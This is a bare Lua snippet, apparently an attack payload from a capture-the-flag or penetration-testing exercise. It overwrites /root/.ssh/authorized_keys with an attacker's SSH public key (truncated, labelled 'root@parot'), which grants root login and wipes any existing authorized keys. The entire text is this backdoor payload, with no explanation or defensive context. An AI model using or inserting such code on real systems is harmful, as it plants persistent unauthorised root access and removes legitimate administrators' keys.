file = io.open("/root/.ssh/authorized_keys", "w")
file:write("ssh-rsa AAAAB3Nza.... root@parot")
file:close()
